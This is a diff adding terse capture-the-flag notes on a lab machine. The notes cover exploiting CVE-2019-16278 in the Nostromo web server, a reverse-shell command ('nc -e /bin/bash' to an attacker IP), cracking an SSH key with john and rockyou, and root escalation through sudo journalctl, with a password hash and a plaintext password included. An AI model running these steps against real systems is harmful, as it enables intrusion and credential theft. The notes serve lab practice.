@@ -1,0 +1,56 @@
+User
+====
+1)get reverse shell with CVE-2019-16278 - Directory transversal to remote code execution
+//curl https://git.sp0re.sh/sp0re/Nhttpd-exploits/raw/branch/master/CVE-2019-16278.sh -o CVE-2019-16278.sh
+
+2)./CVE-2019-16278.sh 10.10.10.165 80 "nc -e /bin/bash 10.10.15.194 18890"
+//rmb to execute "nc -lvp 18890"
+
+3)check /var/nostromo/conf/nhttpd.conf
+# HOMEDIRS [OPTIONAL]
+
+homedirs		/home
+homedirs_public		public_www
+
+#cd to this
+
+
+//note: david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
+4)get the backup ssh id_rsa and crack it.
+/*
+i)ssh2john id_rsa > id_rsa.hash
+ii)john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+iii) password found = id_rsa:hunter
+*/
+
+5) ssh into david 
+//ssh -i home/david/ssh/id_rsa david@10.10.10.165
+//home/david/ssh/id_rsa = the id_rsa private key from the backup of ssh id_rsa
+
+6) got userFlag
+
+Root
+====
+//find the script that have sudo rights. Since we dont have david credential, so cant perform sudo rights
+1) cd <david home dir>/bin/
+2) run server-stats.sh
+//can it be run? can then read the script
+3)cat server-stats.sh
+//cat this script, see it have sudo rights when running the script at the bottom end
+#/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+
+4) create a new .sh file and give +x permission to it.
+/* not showing last 5 log or end of line? reset the box! we want to make it stucked in journalctl exec "!/bin/bash"
+edit the server-stats.sh and remove "| /usr/bin/cat" appended at the script.
+remember to make the terminal size small
+it will be stucked in journalctl something <end of line> in white
+now enter "!/bin/bash"
+*/
+5)voila you've the root access now
+6) go Grab your flag!!
+
+//this journalctl privilege escalation can be found in GTFO bin
+https://gtfobins.github.io/gtfobins/journalctl/
+
+
+
